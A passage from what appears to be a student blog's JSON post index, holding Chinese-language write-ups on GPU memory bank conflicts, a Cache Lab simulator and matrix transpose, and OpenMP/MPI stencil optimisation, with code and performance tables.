的哪种机制引起的？访存合并机制.这种机制如何影响该程序的性能？在 DRAM, L2 cache, L1 cache 之间传输数据的最小单元为 1 sector = 32 Bytes. DRAM 访问总量为 size * STRIDE * sizeof(float) 与 STRIDE 成正比. 因此 STRIDE 越大, 程序访问的 transaction 个数越多, 且近似呈正比, 导致性能反比下降.是否有其他的硬件功能参与了该程序的执行过程, 它们会如何影响该程序的执行效率？cache. 顺序访问时, 数据会被缓存在 cache 中, 从而减少对 DRAM 的直接访问, 提升性能.分析 test_smem.cu 的性能变化来源__global__ void test_shmem() {#if (BITWIDTH == 2) volatile __shared__ uint16_t shm[32 * 128]; volatile uint16_t tmp;#elif (BITWIDTH == 4) volatile __shared__ uint32_t shm[32 * 128]; volatile uint32_t tmp;#elif (BITWIDTH == 8) volatile __shared__ uint64_t shm[32 * 128]; volatile uint64_t tmp;#endif for (int i = 0; i &lt; times; i++) { tmp = shm[threadIdx.x * STRIDE]; }}固定 BITWIDTH 时, 程序的性能变化来源于哪种硬件机制？bank conflict.BITWIDTH 设置为 2,8 时性能变化的趋势相比于 BITWIDTH 设置为 4 时有什么不同之处, 请解释.BITWIDTH 设置为 4 时, bandwidth 随着 STRIDE 的增大而减小. BITWIDTH 设置为 2 时, STRIDE 为 1 和 2 时 bandwidth 几乎相等, 而后变化趋势与 BITWIDTH 设置为 4 时基本相同. BITWIDTH 设置为 8 时, STRIDE 为 16 和 32 时 bandwidth 几乎相等, 在这之前的变化趋势与 BITWIDTH 设置为 4 时基本相同.当 BITWIDTH 为 4 时, 访存粒度为 4 Bytes = 1 bank, 相邻两个 thread 访问地址间隔为 STRIDE 个 bank. 当 STRIDE 为 1 时, 同一 wrap 内的 32 个 thread 访问了第一行内的 32 个 bank, 不存在 bank conflict. 当 STRIDE 为 2 时, threadIdx.x 与 threadIdx.x + 16 访问同一 bank, 发生 2-way bank conflict. 当 STRIDE 为 4 时, threadIdx.x, threadIdx.x + 8, threadIdx.x + 16, threadIdx.x + 24 访问同一个 bank, 发生 4-way bank conflict. 类似的, STRIDE 为 8 和 16 时分别发生 8-way bank conflict 和 16-way bank conflict.当 BITWIDTH 为 2, STRIDE 为 1 时, 相邻两个 thread 访问同一个 bank, 发生 2-way bank conflict, 共访问 16 个 bank. 而 STRIDE 为 2 时, 虽然没有 bank conflict, 但需要访问 32 个 bank. 但由于每次访问仅使用 0.5 bank, 带宽为理论峰值的一半. 因此 STRIDE 为 1 或 2 时性能相近.当 BITWIDTH 为 8, STIRDE 为 16 时, 相邻两个 thread 访存地址间隔为 128 Bytes, 恰为一行. 这意味着, 所有 thread 都访问 bank-0 和 bank-1, 发生 32-way bank conflict. 而当 STRIDE 为 32 时, 相邻两个 thread 访存地址间隔为 256 Bytes, 为两行, 此时所有 thread 仍都访问 bank-0 和 bank-1, 发生 32-way bank conflict. 因此 STRIDE 为 16 或 32 时性能相近.PerformanceGlobal Memory Stride Bandwidth (GB/s) 1 530.015 2 182.471 4 91.9932 8 46.2866 Shared Memory Bitwidth Stride Bandwidth (GB/s) 2 1 4258.05 2 2 4270.88 2 4 2149.69 2 8 831.405 2 16 427.135 2 32 215.022 4 1 8607.33 4 2 4315.77 4 4 2027.46 4 8 1012.86 4 16 504.37 4 32 251.766 8 1 8657.57 8 2 4339.44 8 4 2173.55 8 8 1087.65 8 16 544.069 8 32 544.068 " }, { "title": "Cache Lab: Understanding Cache Memories", "url": "/course-work/computer-organization-and-architecture/2022/05/23/cache-lab/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Cache Lab", "date": "2022-05-23 00:00:00 +0800", "snippet": "Part A: Writing a Cache Simulator argparse 部分使用了更强大的 argp, 而没有使用 getopt (因为一开始没看到作业建议用 getopt)忽略 Instruction Load, Data Load 和 Data Store 都可看作访问一次 cache, 而 Data Modify 由 Data Load 和 Data Store 组成可看作访问两次 cache.Cache 中包含一个 clock_t now; 作为时钟, 每次访问 cache 都会使它 ++. 对于每一个 CacheLine, 使用 timestamp 记录其最近一次被访问到的时间戳.对于一个访问, 首先计算 set_index 和 tag, 即数据应当存放在哪个 CacheSet 中, 相应的 tag 是多少.SetIndex set_index = (address &gt;&gt; cache-&gt;num_block_bits) &amp; (cache-&gt;num_sets - 1);Tag tag = (address &gt;&gt; (cache-&gt;num_block_bits + cache-&gt;num_set_index_bits));然后搜索所需数据是否已在 cache 中for (int i = 0; i &lt; cache-&gt;num_lines_per_set; ++i) { if (cache_lines[i].valid &amp;&amp; cache_lines[i].tag == tag) { // hit cache_lines[i].timestamp = cache-&gt;now; ++(cache-&gt;hits); if (cache-&gt;verbose) printf(\"hit \"); return; }}如果找到, 则 hit, 否则 miss// no hit, miss++(cache-&gt;misses);if (cache-&gt;verbose) printf(\"miss \");如果 miss, 首先寻找空 CacheLine, 尝试将数据存入空 CacheLine// search for empty linefor (int i = 0; i &lt; cache-&gt;num_lines_per_set; ++i) { if (cache_lines[i].valid == false) { // find an empty line cache_lines[i].valid = true; cache_lines[i].tag = tag; cache_lines[i].timestamp = cache-&gt;now; return; }}如果找到一空的 CacheLine, 则填入该 CacheLine. 否则, 所有 CacheLine 都存有数据, 则需要清出一行 CacheLine// no empty line, eviction needed++(cache-&gt;evictions);if (cache-&gt;verbose) printf(\"eviction \");根据 LRU (least-recently used) replacement policy 寻找最老的数据// search for least recently used lineSetIndex least_recently_used_id = 0;for (int i = 1; i &lt; cache-&gt;num_lines_per_set; ++i) { if (cache_lines[i].timestamp &lt; cache_lines[least_recently_used_id].timestamp) { least_recently_used_id = i; }}cache_lines[least_recently_used_id].valid = true;cache_lines[least_recently_used_id].tag = tag;cache_lines[least_recently_used_id].timestamp = cache-&gt;now;Evaluation Your simulator Reference simulatorPoints (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27TEST_CSIM_RESULTS=27Part B: Optimizing Matrix TransposeCache 参数为 number of set index bits number of sets number of lines per set number of block bits block size 5 32 1 5 32 这意味着每个 CacheBlock 能够存储 8 个 int.首先测试默认的 trans(). Points Max pts MissesTrans perf 32x32 0.0 8 1183Trans perf 64x64 0.0 8 4723Trans perf 61x67 0.0 10 4423我们只需针对这三种大小的矩阵进行优化即可.Transpose32x32考虑 cache blocking, 因为每个 CacheBlock 只能存储 8 个 int, 所以选取 BLOCK_SIZE 为 8, 使用 r0...7 作为临时变量记录一个 CacheBlock.char transpose_32x32_desc[] = \"Transpose submission 32x32\";void Transpose32x32(int M, int N, int A[N][M], int B[M][N]) {#define BLOCK_SIZE 8 int current_start_x, current_start_y; int x; int r0, r1, r2, r3, r4, r5, r6, r7; for (current_start_x = 0; current_start_x &lt; N; current_start_x += BLOCK_SIZE) { for (current_start_y = 0; current_start_y &lt; M; current_start_y += BLOCK_SIZE) { for (x = current_start_x; x &lt; current_start_x + BLOCK_SIZE; ++x) { r0 = A[x][current_start_y]; r1 = A[x][current_start_y + 1]; r2 = A[x][current_start_y + 2]; r3 = A[x][current_start_y + 3]; r4 = A[x][current_start_y + 4]; r5 = A[x][current_start_y + 5]; r6 = A[x][current_start_y + 6]; r7 = A[x][current_start_y + 7]; B[current_start_y][x] = r0; B[current_start_y + 1][x] = r1; B[current_start_y + 2][x] = r2; B[current_start_y + 3][x] = r3; B[current_start_y + 4][x] = r4; B[current_start_y + 5][x] = r5; B[current_start_y + 6][x] = r6; B[current_start_y + 7][x] = r7; } } }}Performancefunc 0 (Transpose submission): hits:1766, misses:287, evictions:255Transpose64x64如果仍使用简单的分块方法, 得到的结果很不理想func 0 (Transpose submission): hits:3586, misses:4611, evictions:4579这是因为 A[x][y] 与 A[x + 4][y], 将会对应到同一 CacheSet, 发生冲突, 导致 miss 增加.注意到 Cache 其实有 32 行, 能够存储 4 个 8x8 的矩阵, 这些空行应当被充分利用. 所以, 考虑将 A 中的 8x8 矩阵划分为上下两个 4x8 矩阵, 并且利用 B 中的空余位置记录 Cache. 因此, B 中用来存储这两个 4x8 矩阵的空间在 Cache 中只需要不与 A 中的 8x8 矩阵冲突, 不与 B 中的 8x8 矩阵冲突, 当然也不能互相冲突即可.// unused 4x8 block in B for the upper 4x8 block from a 8x8 block in Aint tmp_up_x = current_x;int tmp_up_y = current_y;do { tmp_up_y += BLOCK_SIZE; if (tmp_up_y &gt;= N) { tmp_up_x += BLOCK_SIZE; tmp_up_y -= N; }} while (tmp_up_y == current_x);// unused 4x8 block in B for the lower 4x8 block from a 8x8 block in Aint tmp_down_x = tmp_up_x;int tmp_down_y = tmp_up_y;do { tmp_down_y += BLOCK_SIZE; if (tmp_down_y &gt;= N) { tmp_down_x += BLOCK_SIZE; tmp_down_y -= N; }} while (tmp_down_y == current_x);如果没有空余的空间, 就直接进行转置if (tmp_up_x &gt;= N) { for (int i = 0; i &lt; BLOCK_SIZE; i++) { for (int j = 0; j &lt; BLOCK_SIZE; j++) { B[current_x + j][current_y + i] = A[current_y + i][current_x + j]; } }}Performancefunc 0 (Transpose submission): hits:14968, misses:1165, evictions:1133Transpose61x67选取一个合适的 BLOCK_SIZE 即可, 这里取为 16.char transpose_61x67_desc[] = \"Transpose submission 61x67\";void Transpose61x67(int M, int N, int A[N][M], int B[M][N]) {#undef BLOCK_SIZE#define BLOCK_SIZE 16 int block_start_x, block_start_y; int x, y; for (block_start_x = 0; block_start_x &lt; M; block_start_x += BLOCK_SIZE) { for (block_start_y = 0; block_start_y &lt; N; block_start_y += BLOCK_SIZE) { for (x = block_start_y; (x &lt; N) &amp;&amp; (x &lt; block_start_y + BLOCK_SIZE); ++x) { for (y = block_start_x; (y &lt; M) &amp;&amp; (y &lt; block_start_x + BLOCK_SIZE); ++y) { B[y][x] = A[x][y]; } } } }}Performancefunc 0 (Transpose submission): hits:6363, misses:1816, evictions:1784Pulling it all TogetherPart A: Testing cache simulatorRunning ./test-csim Your simulator Reference simulatorPoints (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27Part B: Testing transpose functionRunning ./test-trans -M 32 -N 32Running ./test-trans -M 64 -N 64Running ./test-trans -M 61 -N 67Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 287Trans perf 64x64 8.0 8 1165Trans perf 61x67 10.0 10 1816 Total points 53.0 53" }, { "title": "PA2: 模板计算", "url": "/course-work/introduction-to-high-performance-computing/2022/05/17/pa2-%E6%A8%A1%E6%9D%BF%E8%AE%A1%E7%AE%97/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, OMP, MPI", "date": "2022-05-17 00:00:00 +0800", "snippet": "Size: 512 x 512 x 512NaiveNo OPT Performance Threads Computation Time (s) Performance (Gflop/s) Speedup / Single Thread 1 267.075484 0.653310 1. 2 135.902281 1.283886 1.96520182 4 70.080111 2.489766 3.81100243 8 36.813651 4.739629 7.25479328 16 25.793147 6.764706 10.35451164 28 17.400062 10.027726 15.34910839 OPT Performance Threads Computation Time (s) Performance (Gflop/s) Speedup / Single Thread Speedup / Naive Single Thread 1 33.793919 5.163149 1. 7.90306133 2 20.366889 8.566996 1.65925795 13.11321731 4 11.615848 15.021120 2.90929431 22.99233136 8 10.494952 16.625426 3.22001670 25.44798947 16 8.618103 20.246109 3.92127150 30.99004913 28 7.622385 22.890871 4.43350967 35.03829882 OMP使用 Time Skewing + Intrinsic 手动向量化进行优化. Time Skewing 通过在空间维度上进行分块, 在时间维度上进行斜向划分, 使得 t + 1 时刻的计算能够利用 t 时刻缓存在 cache 中的计算结果, 因而提升性能. 注意, 边界上的块会随 t 的增大而逐渐减小. 因此块的大小并不均衡. 好消息是, Time Skewing 并不并行块, 而是在每个块内部进行并行计算, 并不会导致负载的严重不均衡.使用 Intel Intrinsic 手动向量化的优化效果并不明显, 与自动向量化相比几乎没有提升, 但聊胜于无.此外, 由于计算顺序的不同, 结果可能会与串行得到的结果产生微小偏差, 在可接受范围之内, 算法本身没有错误.其余的算法, 如 2D Cache Blocking, Cache Oblivious, Circular Queue 等算法也参考 StencilProbe 进行了实现和测试, 均不如 Time Skewing 高效, 测试结果见 Performance.#define INTRINSIC#include &lt;immintrin.h&gt;#include &lt;omp.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"common.h\"const char *version_name = \"OMP\";void create_dist_grid(dist_grid_info_t *grid_info) { // Naive implementation uses Process 0 to do all computations if (grid_info-&gt;p_id == 0) { grid_info-&gt;local_size_x = grid_info-&gt;global_size_x; grid_info-&gt;local_size_y = grid_info-&gt;global_size_y; grid_info-&gt;local_size_z = grid_info-&gt;global_size_z; } else { grid_info-&gt;local_size_x = 0; grid_info-&gt;local_size_y = 0; grid_info-&gt;local_size_z = 0; } grid_info-&gt;offset_x = 0; grid_info-&gt;offset_y = 0; grid_info-&gt;offset_z = 0; grid_info-&gt;halo_size_x = 1; grid_info-&gt;halo_size_y = 1; grid_info-&gt;halo_size_z = 1;}void destroy_dist_grid(dist_grid_info_t *grid_info) {}int Min(const int a, const int b) { return (a &lt; b) ? a : b; }int Max(const int a, const int b) { return (a &lt; b) ? b : a; }#ifdef INTRINSIC// calculate 4 elements as a vectorvoid Kernel7(cptr_t a0, ptr_t a1, const int x, const int y, const int z, const int ldx, const int ldy) { const __m256d alpha_zzz = _mm256_set1_pd((double)ALPHA_ZZZ); const __m256d alpha_nzz = _mm256_set1_pd((double)ALPHA_NZZ); const __m256d alpha_pzz = _mm256_set1_pd((double)ALPHA_PZZ); const __m256d alpha_znz = _mm256_set1_pd((double)ALPHA_ZNZ); const __m256d alpha_zpz = _mm256_set1_pd((double)ALPHA_ZPZ); const __m256d alpha_zzn = _mm256_set1_pd((double)ALPHA_ZZN); const __m256d alpha_zzp = _mm256_set1_pd((double)ALPHA_ZZP); __m256d zzz = _mm256_loadu_pd(a0 + INDEX(x, y, z, ldx, ldy)); __m256d nzz = _mm256_loadu_pd(a0 + INDEX(x - 1, y, z, ldx, ldy)); __m256d pzz = _mm256_loadu_pd(a0 + INDEX(x + 1, y, z, ldx, ldy)); __m256d znz = _mm256_loadu_pd(a0 + INDEX(x, y - 1, z, ldx, ldy)); __m256d zpz = _mm256_loadu_pd(a0 + INDEX(x, y + 1, z, ldx, ldy)); __m256d zzn = _mm256_loadu_pd(a0 + INDEX(x, y, z - 1, ldx, ldy)); __m256d zzp = _mm256_loadu_pd(a0 + INDEX(x, y, z + 1, ldx, ldy)); __m256d res = _mm256_mul_pd(alpha_zzz, zzz); res = _mm256_fmadd_pd(alpha_nzz, nzz, res); res = _mm256_fmadd_pd(alpha_pzz, pzz, res); res = _mm256_fmadd_pd(alpha_znz, znz, res); res = _mm256_fmadd_pd(alpha_zpz, zpz, res); res = _mm256_fmadd_pd(alpha_zzn, zzn, res); res = _mm256_fmadd_pd(alpha_zzp, zzp, res); _mm256_storeu_pd(a1 + INDEX(x, y, z, ldx, ldy), res);}#endifptr_t stencil_7(ptr_t grid, ptr_t aux, const dist_grid_info_t *grid_info, int nt) { omp_set_num_threads(28); ptr_t buffer[2] = {grid, aux}; int x_start = grid_info-&gt;halo_size_x, x_end = grid_info-&gt;local_size_x + grid_info-&gt;halo_size_x; int y_start = grid_info-&gt;halo_size_y, y_end = grid_info-&gt;local_size_y + grid_info-&gt;halo_size_y; int z_start = grid_info-&gt;halo_size_z, z_end = grid_info-&gt;local_size_z + grid_info-&gt;halo_size_z; int ldx = grid_info-&gt;local_size_x + 2 * grid_info-&gt;halo_size_x; int ldy = grid_info-&gt;local_size_y + 2 * grid_info-&gt;halo_size_y; int ldz = grid_info-&gt;local_size_z + 2 * grid_info-&gt;halo_size_z; const int tx = x_end - x_start; // block size along x-axis const int ty = 16; // block size along y-axis const int tz = 112; // block size along z-axis for (int zz = z_start; zz &lt; z_end; zz += tz) { // shrink size const int neg_z_slope = (zz == z_start) ? 0 : 1; const int pos_z_slope = (zz + tz &lt; z_end) ? -1 : 0; for (int yy = y_start; yy &lt; y_end; yy += ty) { const int neg_y_slope = (yy == y_start) ? 0 : 1; const int pos_y_slope = (yy + ty &lt; y_end) ? -1 : 0; for (int xx = x_start; xx &lt; x_end; xx += tx) { const int neg_x_slope = (xx == x_start) ? 0 : 1; const int pos_x_slope = (xx + tx &lt; x_end) ? -1 : 0; for (int t = 0; t &lt; nt; ++t) { const int block_min_x = Max(x_start, xx - t * neg_x_slope); const int block_min_y = Max(y_start, yy - t * neg_y_slope); const int block_min_z = Max(z_start, zz - t * neg_z_slope); const int block_max_x = Min(x_end, Max(x_start, xx + tx + t * pos_x_slope)); const int block_max_y = Min(y_end, Max(y_start, yy + ty + t * pos_y_slope)); const int block_max_z = Min(z_end, Max(z_start, zz + tz + t * pos_z_slope)); cptr_t a0 = buffer[t % 2]; ptr_t a1 = buffer[(t + 1) % 2];#pragma omp parallel for for (int z = block_min_z; z &lt; block_max_z; z++) { for (int y = block_min_y; y &lt; block_max_y; y++) {#ifdef INTRINSIC for (int x = block_min_x; x &lt; block_max_x / 4 * 4; x += 4) Kernel7(a0, a1, x, y, z, ldx, ldy); for (int x = block_max_x / 4 * 4; x &lt; block_max_x; ++x) { a1[INDEX(x, y, z, ldx, ldy)] = ALPHA_ZZZ * a0[INDEX(x, y, z, ldx, ldy)] + ALPHA_NZZ * a0[INDEX(x - 1, y, z, ldx, ldy)] + ALPHA_PZZ * a0[INDEX(x + 1, y, z, ldx, ldy)] + ALPHA_ZNZ * a0[INDEX(x, y - 1, z, ldx, ldy)] + ALPHA_ZPZ * a0[INDEX(x, y + 1, z, ldx, ldy)] + ALPHA_ZZN * a0[INDEX(x, y, z - 1, ldx, ldy)] + ALPHA_ZZP * a0[INDEX(x, y, z + 1, ldx, ldy)]; }#else#pragma omp simd for (int x = block_min_x; x &lt; block_max_x; ++x) { a1[INDEX(x, y, z, ldx, ldy)] = ALPHA_ZZZ * a0[INDEX(x, y, z, ldx, ldy)] + ALPHA_NZZ * a0[INDEX(x - 1, y, z, ldx, ldy)] + ALPHA_PZZ * a0[INDEX(x + 1, y, z, ldx, ldy)] + ALPHA_ZNZ * a0[INDEX(x, y - 1, z, ldx, ldy)] + ALPHA_ZPZ * a0[INDEX(x, y + 1, z, ldx, ldy)] + ALPHA_ZZN * a0[INDEX(x, y, z - 1, ldx, ldy)] + ALPHA_ZZP * a0[INDEX(x, y, z + 1, ldx, ldy)]; }#endif } } } } } } return buffer[nt % 2];}OMP Performance Threads Computation Time (s) Performance (Gflop/s) Speedup / Single Thread Speedup / Naive Single Thread 1 23.760512 7.3434040 1. 11.24030552 2 12.095517 14.425432 1.9644067 22.08053145 4 6.763701 25.796978 3.5129455 39.48658064 8 3.647941 47.830557 6.513404 73.21265096 16 2.625376 66.460208 9.05032707 101.72844132 28 2.359089 73.962038 10.07190099 113.21124428 MPI考虑对数据进行分块, 并尽量减小通信. 不难发现, 每个块都需要与其相邻的块交换边界上的数据, 因此通信量的大小与分块后内部多出的表面积成正比. 显然, 如果只沿一个方向分块, 无疑是增加面积最大的分块方法, 因此考虑沿 x, y, z 轴进行 3D Blocking, 在进程数为 2, 4, 8, 16, 28 时进行手动分块, 以减少通信.在测试时, 我们发现非阻塞通信的提升并不显著, 且编程相对复杂, 容易产生死锁等问题, 因此最终选用 Sendrecv() 进行通信.此外, 还使用了 Intel Intrinsic 手动向量化进行优化.#define INTRINSIC#include &lt;immintrin.h&gt;#include &lt;mpi.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"common.h\"const char *version_name = \"MPI\";typedef struct { int num_block_x, num_block_y, num_block_z; int id_x, id_y, id_z;} GridId;enum Direction { kXPred, kXSucc, kYPred, kYSucc, kZPred, kZSucc };int Min(const int a, const int b) { return (b &lt; a) ? b : a; }int Ceiling(const int a, const int b) { return (a + (b - 1)) / b; }void Blocking(const int id, const int global_size, const int num_block, int *local_size, int *offset) { int block_size = Ceiling(global_size, num_block); *offset = block_size * id; if ((*offset) &lt; global_size) { *local_size = Min(block_size, global_size - (*offset)); } else { *local_size = 0; }}void create_dist_grid(dist_grid_info_t *grid_info) { GridId *grid_id = malloc(sizeof(GridId)); grid_info-&gt;additional_info = grid_id; grid_id-&gt;num_block_x = 1; grid_id-&gt;num_block_y = 1; grid_id-&gt;num_block_z = 1; switch (grid_info-&gt;p_num) { case 4: { grid_id-&gt;num_block_x = 1; grid_id-&gt;num_block_y = 2; grid_id-&gt;num_block_z = 2; break; } case 8: { grid_id-&gt;num_block_x = 2; grid_id-&gt;num_block_y = 2; grid_id-&gt;num_block_z = 2; break; } case 16: { grid_id-&gt;num_block_x = 2; grid_id-&gt;num_block_y = 2; grid_id-&gt;num_block_z = 4; break; } case 28: { grid_id-&gt;num_block_x = 2; grid_id-&gt;num_block_y = 2; grid_id-&gt;num_block_z = 7; break; } default: { grid_id-&gt;num_block_x = 1; grid_id-&gt;num_block_y = 1; grid_id-&gt;num_block_z = grid_info-&gt;p_num; break; } } grid_id-&gt;id_x = grid_info-&gt;p_id % grid_id-&gt;num_block_x; grid_id-&gt;id_y = (grid_info-&gt;p_id / grid_id-&gt;num_block_x) % grid_id-&gt;num_block_y; grid_id-&gt;id_z = grid_info-&gt;p_id / (grid_id-&gt;num_block_x * grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_x, grid_info-&gt;global_size_x, grid_id-&gt;num_block_x, &amp;(grid_info-&gt;local_size_x), &amp;(grid_info-&gt;offset_x)); Blocking(grid_id-&gt;id_y, grid_info-&gt;global_size_y, grid_id-&gt;num_block_y, &amp;(grid_info-&gt;local_size_y), &amp;(grid_info-&gt;offset_y)); Blocking(grid_id-&gt;id_z, grid_info-&gt;global_size_z, grid_id-&gt;num_block_z, &amp;(grid_info-&gt;local_size_z), &amp;(grid_info-&gt;offset_z)); grid_info-&gt;halo_size_x = 1; grid_info-&gt;halo_size_y = 1; grid_info-&gt;halo_size_z = 1;}void destroy_dist_grid(dist_grid_info_t *grid_info) { free(grid_info-&gt;additional_info);}#ifdef INTRINSICvoid Kernel7(cptr_t a0, ptr_t a1, const int x, const int y, const int z, const int ldx, const int ldy) { const __m256d alpha_zzz = _mm256_set1_pd((double)ALPHA_ZZZ); const __m256d alpha_nzz = _mm256_set1_pd((double)ALPHA_NZZ); const __m256d alpha_pzz = _mm256_set1_pd((double)ALPHA_PZZ); const __m256d alpha_znz = _mm256_set1_pd((double)ALPHA_ZNZ); const __m256d alpha_zpz = _mm256_set1_pd((double)ALPHA_ZPZ); const __m256d alpha_zzn = _mm256_set1_pd((double)ALPHA_ZZN); const __m256d alpha_zzp = _mm256_set1_pd((double)ALPHA_ZZP); __m256d zzz = _mm256_loadu_pd(a0 + INDEX(x, y, z, ldx, ldy)); __m256d nzz = _mm256_loadu_pd(a0 + INDEX(x - 1, y, z, ldx, ldy)); __m256d pzz = _mm256_loadu_pd(a0 + INDEX(x + 1, y, z, ldx, ldy)); __m256d znz = _mm256_loadu_pd(a0 + INDEX(x, y - 1, z, ldx, ldy)); __m256d zpz = _mm256_loadu_pd(a0 + INDEX(x, y + 1, z, ldx, ldy)); __m256d zzn = _mm256_loadu_pd(a0 + INDEX(x, y, z - 1, ldx, ldy)); __m256d zzp = _mm256_loadu_pd(a0 + INDEX(x, y, z + 1, ldx, ldy)); __m256d res = _mm256_mul_pd(alpha_zzz, zzz); res = _mm256_fmadd_pd(alpha_nzz, nzz, res); res = _mm256_fmadd_pd(alpha_pzz, pzz, res); res = _mm256_fmadd_pd(alpha_znz, znz, res); res = _mm256_fmadd_pd(alpha_zpz, zpz, res); res = _mm256_fmadd_pd(alpha_zzn, zzn, res); res = _mm256_fmadd_pd(alpha_zzp, zzp, res); _mm256_storeu_pd(a1 + INDEX(x, y, z, ldx, ldy), res);}#endifptr_t stencil_7(ptr_t grid, ptr_t aux, const dist_grid_info_t *grid_info, int nt) { ptr_t buffer[2] = {grid, aux}; int x_start = grid_info-&gt;halo_size_x, x_end = grid_info-&gt;local_size_x + grid_info-&gt;halo_size_x; int y_start = grid_info-&gt;halo_size_y, y_end = grid_info-&gt;local_size_y + grid_info-&gt;halo_size_y; int z_start = grid_info-&gt;halo_size_z, z_end = grid_info-&gt;local_size_z + grid_info-&gt;halo_size_z; int ldx = grid_info-&gt;local_size_x + 2 * grid_info-&gt;halo_size_x; int ldy = grid_info-&gt;local_size_y + 2 * grid_info-&gt;halo_size_y; int ldz = grid_info-&gt;local_size_z + 2 * grid_info-&gt;halo_size_z; MPI_Datatype XY_PLANE, XZ_PLANE, YZ_PLANE; MPI_Type_vector(/*count=*/1, /*blocklength=*/ldx * ldy, /*stride=*/0, /*oldtype=*/MPI_DOUBLE, /*newtype=*/&amp;XY_PLANE); MPI_Type_vector(/*count=*/ldz, /*blocklength=*/ldx, /*stride=*/ldx * ldy, /*oldtype=*/MPI_DOUBLE, /*newtype=*/&amp;XZ_PLANE); MPI_Type_vector(/*count=*/ldy * ldz, /*blocklength=*/1, /*stride=*/ldx, /*oldtype=*/MPI_DOUBLE, /*newtype=*/&amp;YZ_PLANE); MPI_Type_commit(&amp;XY_PLANE); MPI_Type_commit(&amp;XZ_PLANE); MPI_Type_commit(&amp;YZ_PLANE); GridId *grid_id = grid_info-&gt;additional_info; int pid[6]; int block_size[6] = {0}; int offset; if (grid_id-&gt;id_x &gt; 0) { pid[kXPred] = INDEX(grid_id-&gt;id_x - 1, grid_id-&gt;id_y, grid_id-&gt;id_z, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_x - 1, grid_info-&gt;global_size_x, grid_id-&gt;num_block_x, &amp;block_size[kXPred], &amp;offset); } if (grid_id-&gt;id_x + 1 &lt; grid_id-&gt;num_block_x) { pid[kXSucc] = INDEX(grid_id-&gt;id_x + 1, grid_id-&gt;id_y, grid_id-&gt;id_z, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_x + 1, grid_info-&gt;global_size_x, grid_id-&gt;num_block_x, &amp;block_size[kXSucc], &amp;offset); } if (grid_id-&gt;id_y &gt; 0) { pid[kYPred] = INDEX(grid_id-&gt;id_x, grid_id-&gt;id_y - 1, grid_id-&gt;id_z, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_y - 1, grid_info-&gt;global_size_y, grid_id-&gt;num_block_y, &amp;block_size[kYPred], &amp;offset); } if (grid_id-&gt;id_y + 1 &lt; grid_id-&gt;num_block_y) { pid[kYSucc] = INDEX(grid_id-&gt;id_x, grid_id-&gt;id_y + 1, grid_id-&gt;id_z, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_y + 1, grid_info-&gt;global_size_y, grid_id-&gt;num_block_y, &amp;block_size[kYSucc], &amp;offset); } if (grid_id-&gt;id_z &gt; 0) { pid[kZPred] = INDEX(grid_id-&gt;id_x, grid_id-&gt;id_y, grid_id-&gt;id_z - 1, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_z - 1, grid_info-&gt;global_size_z, grid_id-&gt;num_block_z, &amp;block_size[kZPred], &amp;offset); } if (grid_id-&gt;id_z + 1 &lt; grid_id-&gt;num_block_z) { pid[kZSucc] = INDEX(grid_id-&gt;id_x, grid_id-&gt;id_y, grid_id-&gt;id_z + 1, grid_id-&gt;num_block_x, grid_id-&gt;num_block_y); Blocking(grid_id-&gt;id_z + 1, grid_info-&gt;global_size_z, grid_id-&gt;num_block_z, &amp;block_size[kZSucc], &amp;offset); } for (int t = 0; t &lt; nt; ++t) { ptr_t a0 = buffer[t % 2]; ptr_t a1 = buffer[(t + 1) % 2]; if (block_size[kXPred]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(x_start, 0, 0, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/YZ_PLANE, /*dest=*/pid[kXPred], /*sendtag=*/kXPred, /*recvbuf=*/&amp;a0[INDEX(x_start - 1, 0, 0, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/YZ_PLANE, /*source=*/pid[kXPred], /*recvtag=*/kXSucc, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } if (block_size[kXSucc]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(x_end - 1, 0, 0, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/YZ_PLANE, /*dest=*/pid[kXSucc], /*sendtag=*/kXSucc, /*recvbuf=*/&amp;a0[INDEX(x_end, 0, 0, ldx, ldy)], /*recvcount=*/1, /*recvtype=*/YZ_PLANE, /*source=*/pid[kXSucc], /*recvtag=*/kXPred, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); } if (block_size[kYPred]) { MPI_Sendrecv(/*sendbuf=*/&amp;a0[INDEX(0, y_start, 0, ldx, ldy)], /*sendcount=*/1, /*sendtype=*/XZ_PLANE, /*dest=*/pid[kYPred], 